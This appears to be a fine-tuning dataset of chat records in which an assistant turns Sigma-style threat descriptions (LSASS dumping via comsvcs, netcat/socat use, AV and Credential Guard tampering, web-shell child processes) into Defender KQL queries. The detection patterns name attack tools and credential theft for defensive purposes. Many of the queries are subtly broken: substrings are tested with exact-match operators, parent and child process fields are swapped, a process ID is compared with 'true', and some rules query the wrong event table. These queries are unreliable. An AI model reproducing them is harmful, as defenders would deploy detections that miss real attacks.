{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a process memory dump via \"comsvcs.dll\" using rundll32, covering multiple different techniques (ordinal, minidump function, etc.) Topic: proc_creation_win_rundll32_process_dump_via_comsvcs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or ProcessCommandLine contains \"rundll32\") and (ProcessCommandLine in~ (\"#-\", \"#+\", \"#24\", \"24 \", \"MiniDump\"))) or (ProcessCommandLine in~ (\" #\", \",#\", \", #\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Attackers may leverage fsutil to enumerated connected drives. Topic: proc_creation_win_fsutil_drive_enumeration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"drives\" and (FolderPath endswith \"\\\\fsutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"fsutil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the injection of code by overwriting the memory map of a Linux process using the \"dd\" Linux command. Topic: proc_creation_lnx_dd_process_injection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"of=\", \"/proc/\", \"/mem\")) and InitiatingProcessFolderPath =~ \"/dd\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence\nThe content of C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd is read whenever some tools under C:\\WINDOWS\\System32\\oobe\\ (e.g. Setup.exe) fail to run for any reason.\n Topic: file_event_win_errorhandler_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\WINDOWS\\\\Setup\\\\Scripts\\\\ErrorHandler.cmd\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects files that have extensions commonly seen while SDelete is used to wipe files. Topic: win_security_sdelete_potential_secure_deletion"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \".AAA\" or RegistryKey endswith \".ZZZ\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\nincluding OS, CPU, GPU, disk drive names, memory capacity, display resolution, baseboard, BIOS,\nand GPU driver products/versions.\n Topic: proc_creation_win_wmic_recon_system_info"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"caption\", \"command\", \"driverversion\", \"maxcapacity\", \"name\", \"osarchitecture\", \"product\", \"size\", \"smbiosbiosversion\", \"version\", \"videomodedescription\")) and (ProcessCommandLine in~ (\"baseboard\", \"bios\", \"cpu\", \"diskdrive\", \"logicaldisk\", \"memphysical\", \"os\", \"path\", \"startup\", \"win32_videocontroller\")) and ProcessCommandLine =~ \"get\" and (ProcessVersionInfoFileDescription =~ \"WMI Commandline Utility\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")) and (not(InitiatingProcessCommandLine =~ \"\\\\VMware\\\\VMware Tools\\\\serviceDiscovery\\\\scripts\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence via autorun.\nThe disk cleanup manager is part of the operating system.\nIt displays the dialog box [\u2026] The user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup managers UI.\nAlthough Windows comes with a number of disk cleanup handlers, they arent designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n Topic: registry_set_disk_cleanup_handler_autorun_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\VolumeCaches*\" and ((RegistryKey contains \"\\\\Autorun\" and RegistryValueData =~ \"DWORD (0x00000001)\") or ((RegistryKey contains \"\\\\CleanupString\" or RegistryKey contains \"\\\\PreCleanupString\") and (RegistryValueData contains \"cmd\" or RegistryValueData contains \"powershell\" or RegistryValueData contains \"rundll32\" or RegistryValueData contains \"mshta\" or RegistryValueData contains \"cscript\" or RegistryValueData contains \"wscript\" or RegistryValueData contains \"wsl\" or RegistryValueData contains \"\\\\Users\\\\Public\\\\\" or RegistryValueData contains \"\\\\Windows\\\\TEMP\\\\\" or RegistryValueData contains \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity Topic: proc_creation_win_imagingdevices_unusual_parents"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\ImagingDevices.exe\" or ((InitiatingProcessFileName in~ (\"\\\\WmiPrvSE.exe\", \"\\\\svchost.exe\", \"\\\\dllhost.exe\")) and InitiatingProcessFolderPath =~ \"\\\\ImagingDevices.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious winrar execution in a folder which is not the default installation folder Topic: proc_creation_win_winrar_uncommon_folder_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\rar.exe\" or FolderPath endswith \"\\\\winrar.exe\") or ProcessVersionInfoFileDescription =~ \"Command line RAR\") and (not(((FolderPath contains \":\\\\Program Files (x86)\\\\WinRAR\\\\\" or FolderPath contains \":\\\\Program Files\\\\WinRAR\\\\\") or InitiatingProcessFolderPath =~ \"\\\\UnRAR.exe\"))) and (not(FolderPath contains \":\\\\Windows\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\nThis option may be used adversaries to execute malicious code by signed verified binary.\nThe debugger is installed alongside with Microsoft Visual Studio package.\n Topic: proc_creation_win_susp_use_of_vsjitdebugger_bin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\vsjitdebugger.exe\" and (not((InitiatingProcessFolderPath in~ (\"\\\\devenv.exe\") or (InitiatingProcessFolderPath contains \"\\\\vsimmersiveactivatehelper\" and InitiatingProcessFolderPath contains \".exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n Topic: registry_set_susp_service_installed"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey in~ (\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Services\\\\NalDrv\\\\ImagePath\", \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Services\\\\PROCEXP152\\\\ImagePath\")) and (not((RegistryValueData contains \"\\\\WINDOWS\\\\system32\\\\Drivers\\\\PROCEXP152.SYS\" and (InitiatingProcessFolderPath in~ (\"\\\\procexp64.exe\", \"\\\\procexp.exe\", \"\\\\procmon64.exe\", \"\\\\procmon.exe\", \"\\\\handle.exe\", \"\\\\handle64.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll Topic: registry_set_rpcrt4_etw_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\Rpc\\\\ExtErrorInformation\" and (RegistryValueData in~ (\"DWORD (0x00000000)\", \"DWORD (0x00000002)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential COM object hijacking via modification of default system CLSID. Topic: registry_set_persistence_com_hijacking_builtin"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\CLSID*\" and (RegistryKey endswith \"\\\\InprocServer32\\\\(Default)\" or RegistryKey endswith \"\\\\LocalServer32\\\\(Default)\")) and (RegistryKey endswith \"\\\\{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}*\" or RegistryKey endswith \"\\\\{2155fee3-2419-4373-b102-6843707eb41f}*\" or RegistryKey endswith \"\\\\{4590f811-1d3a-11d0-891f-00aa004b2e24}*\" or RegistryKey endswith \"\\\\{4de225bf-cf59-4cfc-85f7-68b90f185355}*\" or RegistryKey endswith \"\\\\{ddc05a5a-351a-4e06-8eaf-54ec1bc2dcea}*\" or RegistryKey endswith \"\\\\{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}*\" or RegistryKey endswith \"\\\\{F82B4EF1-93A9-4DDE-8015-F7950A1A6E31}*\" or RegistryKey endswith \"\\\\{7849596a-48ea-486e-8937-a2a3009f31a9}*\" or RegistryKey endswith \"\\\\{0b91a74b-ad7c-4a9d-b563-29eef9167172}*\" or RegistryKey endswith \"\\\\{603D3801-BD81-11d0-A3A5-00C04FD706EC}*\")) and ((RegistryValueData contains \":\\\\Perflogs\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\\" or RegistryValueData contains \"\\\\Desktop\\\\\" or RegistryValueData contains \"\\\\Downloads\\\\\" or RegistryValueData contains \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\" or RegistryValueData contains \"\\\\System32\\\\spool\\\\drivers\\\\color\\\\\" or RegistryValueData contains \"\\\\Temporary Internet\" or RegistryValueData contains \"\\\\Users\\\\Public\\\\\" or RegistryValueData contains \"\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"%appdata%\" or RegistryValueData contains \"%temp%\" or RegistryValueData contains \"%tmp%\") or ((RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favorites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favourites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Contacts\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Pictures\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of Python DLL files. Topic: image_load_side_load_python"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\python39.dll\" or FolderPath endswith \"\\\\python310.dll\" or FolderPath endswith \"\\\\python311.dll\" or FolderPath endswith \"\\\\python312.dll\") and (not((((FolderPath startswith \"C:\\\\Program Files\\\\Python3\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Python3\") or FolderPath contains \"\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python3\") or (InitiatingProcessVersionInfoCompanyName =~ \"Python Software Foundation\" and InitiatingProcessVersionInfoFileDescription =~ \"Python\" and InitiatingProcessVersionInfoCompanyName =~ \"true\" and InitiatingProcessVersionInfoProductName =~ \"Python\")))) and (not(((FolderPath contains \"\\\\cpython\\\\externals\\\\\" or FolderPath contains \"\\\\cpython\\\\PCbuild\\\\\") or FolderPath startswith \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag. Topic: proc_creation_win_powershell_set_policies_to_unsecure_level"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or (FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\")) and (ProcessCommandLine in~ (\"Bypass\", \"Unrestricted\")) and (ProcessCommandLine in~ (\"-executionpolicy \", \" -ep \", \" -exec \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential evasion or obfuscation attempts using bogus path traversal via the commandline Topic: proc_creation_win_susp_commandline_path_traversal_evasion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath contains \"\\\\Windows\\\\\" and (ProcessCommandLine in~ (\"\\\\..\\\\Windows\\\\\", \"\\\\..\\\\System32\\\\\", \"\\\\..\\\\..\\\\\"))) or ProcessCommandLine =~ \".exe\\\\..\\\\\") and (not((ProcessCommandLine in~ (\"\\\\Citrix\\\\Virtual Smart Card\\\\Citrix.Authentication.VirtualSmartcard.Launcher.exe\\\\..\\\\\", \"\\\\Google\\\\Drive\\\\googledrivesync.exe\\\\..\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required) Topic: registry_set_dhcp_calloutdll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services\\\\DHCPServer\\\\Parameters\\\\CalloutDlls\" or RegistryKey endswith \"\\\\Services\\\\DHCPServer\\\\Parameters\\\\CalloutEnabled\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential malicious modification of the property value of IsCredGuardEnabled from\nHKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to disable Cred Guard on a system.\nThis is usually used with UseLogonCredential to manipulate the caching credentials.\n Topic: registry_event_disable_wdigest_credential_guard"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\IsCredGuardEnabled\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the launch of a child process via \"conhost.exe\" with the \"--headless\" flag.\nThe \"--headless\" flag hides the windows from the user upon execution.\n Topic: proc_creation_win_conhost_headless_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"--headless\" and InitiatingProcessFileName =~ \"\\\\conhost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tamper attempts to sophos av functionality via registry key modification Topic: registry_set_sophos_av_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Sophos Endpoint Defense\\\\TamperProtection\\\\Config\\\\SAVEnabled\" or RegistryKey contains \"\\\\Sophos Endpoint Defense\\\\TamperProtection\\\\Config\\\\SEDEnabled\" or RegistryKey contains \"\\\\Sophos\\\\SAVService\\\\TamperProtection\\\\Enabled\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"vsan\" flag in order to retrieve information about virtual storage. Seen used by malware such as DarkSide. Topic: proc_creation_lnx_esxcli_vsan_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" get\", \" list\")) and (ProcessCommandLine =~ \"vsan\" and InitiatingProcessFolderPath =~ \"/esxcli\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen Topic: proc_creation_win_cmd_sticky_key_like_backdoor_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\winlogon.exe\" and (ProcessCommandLine in~ (\"sethc.exe\", \"utilman.exe\", \"osk.exe\", \"Magnify.exe\", \"Narrator.exe\", \"DisplaySwitch.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\", \"\\\\wt.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts of decoding a base64 Gzip archive via PowerShell. This technique is often used as a method to load malicious content into memory afterward. Topic: proc_creation_win_powershell_frombase64string_archive"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"FromBase64String\", \"MemoryStream\", \"H4sI\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file modifications to the temporary xml user database file indicating local user modification in the ScreenConnect server.\nThis will occur during exploitation of the ScreenConnect Authentication Bypass vulnerability (CVE-2024-1709) in versions <23.9.8, but may also be observed when making legitimate modifications to local users or permissions.\n Topic: file_event_win_exploit_cve_2024_1709_user_database_modification_screenconnect"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"Temp\", \"ScreenConnect\")) and InitiatingProcessFolderPath =~ \"\\\\ScreenConnect.Service.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications. Topic: proc_creation_win_clip_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\clip.exe\" or ProcessVersionInfoOriginalFileName =~ \"clip.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects cmstp loading \"dll\" or \"ocx\" files from suspicious locations Topic: image_load_cmstp_load_dll_from_susp_location"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \"\\\\PerfLogs\\\\\" or FolderPath contains \"\\\\ProgramData\\\\\" or FolderPath contains \"\\\\Users\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\" or FolderPath contains \"C:\\\\Temp\\\\\") and (FolderPath endswith \".dll\" or FolderPath endswith \".ocx\") and InitiatingProcessFolderPath =~ \"\\\\cmstp.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc. Topic: proc_creation_win_susp_shell_spawn_susp_program"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\rundll32.exe\", \"\\\\cscript.exe\", \"\\\\wscript.exe\", \"\\\\wmiprvse.exe\", \"\\\\regsvr32.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\schtasks.exe\", \"\\\\nslookup.exe\", \"\\\\certutil.exe\", \"\\\\bitsadmin.exe\", \"\\\\mshta.exe\"))) and (not(((InitiatingProcessCommandLine in~ (\"\\\\Program Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\setup-scheduledtask.ps1\", \"\\\\Program Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\set-selfhealing.ps1\", \"\\\\Program Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\check-workspacehealth.ps1\", \"\\\\nessus_\")) or InitiatingProcessFolderPath =~ \"\\\\ccmcache\\\\\" or ProcessCommandLine =~ \"\\\\nessus_\" or ((InitiatingProcessCommandLine in~ (\"C:\\\\MEM_Configmgr_\", \"\\\\splash.hta\", \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\")) and InitiatingProcessFileName =~ \"\\\\mshta.exe\" and (ProcessCommandLine in~ (\"C:\\\\MEM_Configmgr_\", \"\\\\SMSSETUP\\\\BIN\\\\\", \"\\\\autorun.hta\", \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\")) and InitiatingProcessFolderPath =~ \"\\\\mshta.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation Topic: proc_creation_win_net_share_unmount"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"share\", \"/delete\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS). Topic: proc_creation_win_rundll32_ads_stored_dll_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and ProcessCommandLine matches regex \"[Rr][Uu][Nn][Dd][Ll][Ll]32(\\\\.[Ee][Xx][Ee])? \\\\S+?\\\\w:\\\\S+?:\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable initiating a network connection to \"ngrok\" tunneling domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download.\n Topic: net_connection_win_domain_ngrok_tunnel"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where RemoteUrl in~ (\"tunnel.us.ngrok.com\", \"tunnel.eu.ngrok.com\", \"tunnel.ap.ngrok.com\", \"tunnel.au.ngrok.com\", \"tunnel.sa.ngrok.com\", \"tunnel.jp.ngrok.com\", \"tunnel.in.ngrok.com\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation of CVE-2023-21554 (dubbed QueueJumper) Topic: proc_creation_win_exploit_cve_2023_21554_queuejumper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\Windows\\\\System32\\\\mqsvc.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\", \"\\\\wsl.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with the \".dmp\"/\".hdmp\" extension. Often created by software during a crash. Memory dumps can sometimes contain sensitive information such as credentials. Its best to determine the source of the crash. Topic: file_event_win_dump_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".dmp\", \".dump\", \".hdmp\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a \"winlogon.exe\" process that initiate network communications with public IP addresses Topic: net_connection_win_winlogon_net_connections"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\winlogon.exe\") and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of network scanning and reconnaisance tools. These tools can be used for the enumeration of local or remote network services for example. Topic: proc_creation_lnx_susp_network_utilities_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFolderPath in~ (\"/nc\", \"/ncat\", \"/netcat\", \"/socat\")) and (not((ProcessCommandLine in~ (\" --listen \", \" -l \"))))) or (InitiatingProcessFolderPath in~ (\"/autorecon\", \"/hping\", \"/hping2\", \"/hping3\", \"/naabu\", \"/nmap\", \"/nping\", \"/telnet\", \"/zenmap\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"goopdate.dll\", a DLL used by googleupdate.exe Topic: image_load_side_load_goopdate"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\goopdate.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\\"))) and (not(((InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\GUM\" and InitiatingProcessFolderPath contains \".tmp\\\\Dropbox\") and (FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\GUM\" and FolderPath contains \".tmp\\\\goopdate.dll\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of sudoers file or files in \"sudoers.d\" directory which can be used a potential method to persiste privileges for a specific user. Topic: file_event_lnx_persistence_sudoers_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"/etc/sudoers.d/\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation\n Topic: proc_creation_win_webshell_susp_process_spawned_from_webserver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"-tomcat-\", \"\\\\tomcat\")) or ((InitiatingProcessCommandLine in~ (\"CATALINA_HOME\", \"catalina.home\", \"catalina.jar\")) and (InitiatingProcessFileName in~ (\"\\\\java.exe\", \"\\\\javaw.exe\"))) or (InitiatingProcessFileName in~ (\"\\\\caddy.exe\", \"\\\\httpd.exe\", \"\\\\nginx.exe\", \"\\\\php-cgi.exe\", \"\\\\php.exe\", \"\\\\tomcat.exe\", \"\\\\UMWorkerProcess.exe\", \"\\\\w3wp.exe\", \"\\\\ws_TomcatService.exe\"))) and (InitiatingProcessFolderPath in~ (\"\\\\arp.exe\", \"\\\\at.exe\", \"\\\\bash.exe\", \"\\\\bitsadmin.exe\", \"\\\\certutil.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\dsget.exe\", \"\\\\hostname.exe\", \"\\\\nbtstat.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\netdom.exe\", \"\\\\netsh.exe\", \"\\\\nltest.exe\", \"\\\\ntdsutil.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\qprocess.exe\", \"\\\\query.exe\", \"\\\\qwinsta.exe\", \"\\\\reg.exe\", \"\\\\rundll32.exe\", \"\\\\sc.exe\", \"\\\\sh.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\", \"\\\\wusa.exe\")) and (not(((ProcessCommandLine endswith \"Windows\\\\system32\\\\cmd.exe /c C:\\\\ManageEngine\\\\ADManager \\\"Plus\\\\ES\\\\bin\\\\elasticsearch.bat -Enode.name=RMP-NODE1 -pelasticsearch-pid.txt\" and InitiatingProcessFileName =~ \"\\\\java.exe\") or (InitiatingProcessFileName =~ \"\\\\java.exe\" and (ProcessCommandLine in~ (\"sc query\", \"ADManager Plus\"))))))"}]}
